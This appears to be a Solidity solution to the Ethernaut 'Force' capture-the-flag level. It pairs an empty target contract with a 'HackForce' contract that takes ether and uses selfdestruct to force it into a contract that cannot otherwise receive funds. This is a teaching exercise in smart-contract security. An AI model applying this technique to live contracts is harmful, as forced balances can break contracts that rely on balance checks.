// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


contract HackForce {

    function balance() public payable returns(uint) {
        return address(this).balance;
    }

    function destruct(
        address payable recieve
    ) public {
        selfdestruct(recieve);
    }
}